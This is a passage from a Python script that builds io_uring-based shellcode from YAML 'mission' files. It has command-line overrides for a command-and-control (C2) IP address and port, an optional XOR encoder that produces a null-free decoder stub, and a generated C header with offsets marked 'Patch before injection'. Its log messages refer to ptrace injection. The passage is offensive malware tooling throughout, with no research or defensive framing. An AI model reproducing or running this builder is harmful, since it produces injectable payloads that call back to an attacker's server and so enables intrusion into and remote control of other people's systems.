            f'#define SHELLCODE_XOR         1',
            (f'/* XOR-encoded: state=0x{encode_meta["state"]:04x} '
             f'step=0x{encode_meta["step"]:04x} '
             f'payload_start={encode_meta["payload_start"]} */'),
            (f'/* Config offsets below point INTO the pre-encode payload. To '
             f'patch a running artefact, decode first (offset i -> '
             f'payload_start + i) — simpler: regenerate with --ip/--port. */'),
            '',
        ]
    for name, off in sorted(offsets.items()):
        lines.append(f'#define {name:<28} {off}')
    lines += [
        '',
        '/* Patch before injection: */',
        (f'/* CONFIG_IP_OFFSET   : {offsets.get("CONFIG_IP_OFFSET","?")} '
         f'(4 bytes, network byte order) */'),
        (f'/* CONFIG_PORT_OFFSET : {offsets.get("CONFIG_PORT_OFFSET","?")} '
         f'(2 bytes, big-endian) */'),
        '',
        f'extern unsigned char shellcode[{len(binary)}];',
    ]
    outfile.write_text('\n'.join(lines) + '\n')

# ----------------------------------------------------------------
# CLI
# ----------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description='Generate io_uring shellcode from YAML mission'
    )
    p.add_argument('mission', help='Path to YAML mission file')
    p.add_argument('--ip',       default=None, help='Override C2 IP')
    p.add_argument('--port',     default=None, type=int, help='Override C2 port')
    p.add_argument('--out',      default='shellcode.bin', help='Output binary')
    p.add_argument('--header',   default='shellcode.h',  help='Output C header')
    p.add_argument('--encode',   default='none', choices=['none', 'xor'],
                   help='Wrap artifact in a null-free decoder stub (delivery '
                        'into null-terminated buffers). Note: the emitted '
                        'patchable offsets point INTO the encoded payload; '
                        'set --ip/--port at build time instead of patching.')
    p.add_argument('--keep-asm', default=None, metavar='FILE',
                   help='Keep intermediate .asm source')
    p.add_argument('--quiet', action='store_true')
    return p.parse_args()

def log(msg: str, quiet: bool = False) -> None:
    if not quiet:
        print(msg)

def main() -> None:
    args = parse_args()

    mission = load_mission(Path(args.mission))
    apply_overrides(mission, args.ip, args.port)

    log(f'[*] Mission   : {mission["name"]}', args.quiet)
    log(f'[*] C2        : {mission["config"]["c2_ip"]}:{mission["config"]["c2_port"]}',
        args.quiet)
    log(f'[*] Ops       : {len(mission["ops"])}', args.quiet)
    kern_req = mission.get('requires_kernel')
    if kern_req:
        log(f'[*] Kernel req: >= {kern_req} (mission YAML — check the TARGET host)',
            args.quiet)

    # Render Layer 2 + data section
    mission_code, data_asm = render_layer2(mission)

    # Combine with Layer 0 + Layer 1 base
    full_asm = build_full_asm(mission_code, data_asm, mission['name'])

    # Assemble
    out_path  = Path(args.out)
    keep_path = Path(args.keep_asm) if args.keep_asm else None
    label_offsets = assemble(full_asm, out_path, keep_path)

    binary = out_path.read_bytes()
    log(f'[*] Size      : {len(binary)} bytes', args.quiet)

    encode_meta = None
    if args.encode == 'xor':
        encoded, encode_meta = xor_encode(binary)
        out_path.write_bytes(encoded)
        binary = encoded
        log(f'[*] Encode    : xor — decoder stub {encode_meta["payload_start"]} B + region '
            f'{encode_meta["region_len"]} B (state=0x{encode_meta["state"]:04x} '
            f'step=0x{encode_meta["step"]:04x})', args.quiet)

    # Check nulls
    nulls = check_nulls(binary)
    if nulls:
        log(f'[!] Null bytes: {len(nulls)} (offsets: {nulls[:8]}...)', args.quiet)
        log(f'[!]   Irrelevant for ptrace injection; use encoder for null-sensitive contexts.',
            args.quiet)
    else:
        log(f'[*] Null bytes: 0 — clean', args.quiet)

    # Get patchable config offsets from listing and emit header
    offsets = compute_offsets(label_offsets)
    header_path = Path(args.header)
    emit_header(binary, offsets, mission, header_path, encode_meta)

    log(f'[*] Output    : {out_path}', args.quiet)
    log(f'[*] Header    : {header_path}', args.quiet)
    for name, off in sorted(offsets.items()):
        log(f'[*]   {name} = {off}', args.quiet)

    if keep_path:
        log(f'[*] ASM kept  : {keep_path}', args.quiet)

if __name__ == '__main__':
    main()
